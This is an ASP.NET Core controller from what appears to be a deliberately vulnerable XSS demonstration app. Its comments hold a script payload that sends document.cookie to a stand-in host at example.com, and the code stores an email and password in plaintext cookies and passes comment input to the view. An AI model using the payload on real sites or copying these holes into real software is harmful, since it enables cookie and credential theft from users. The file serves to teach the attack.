using Microsoft.AspNetCore.Mvc;
using System.Diagnostics;
using XSS.Web.Models;

namespace XSS.Web.Controllers
{
    public class HomeController : Controller
    {
        private readonly ILogger<HomeController> _logger;

        public HomeController(ILogger<HomeController> logger)
        {
            _logger = logger;
        }

        public IActionResult CommentAdd()
        {
            // <script>new Image().src="http://www.example.com/cookiereader?accountinformation="+ document.cookie</script>
            // <script>alert(document.cookie)</script>
            HttpContext.Response.Cookies.Append("email", "example@mail.com");
            HttpContext.Response.Cookies.Append("password", "1234");
            return View();
        }

        [HttpPost]
        public IActionResult CommentAdd(string name, string comment)
        {
            ViewBag.name = name;
            ViewBag.comment = comment;

            return View();
        }

        public IActionResult Index()
        {
            return View();
        }

        public IActionResult Privacy()
        {
            return View();
        }

        [ResponseCache(Duration = 0, Location = ResponseCacheLocation.None, NoStore = true)]
        public IActionResult Error()
        {
            return View(new ErrorViewModel { RequestId = Activity.Current?.Id ?? HttpContext.TraceIdentifier });
        }
    }
}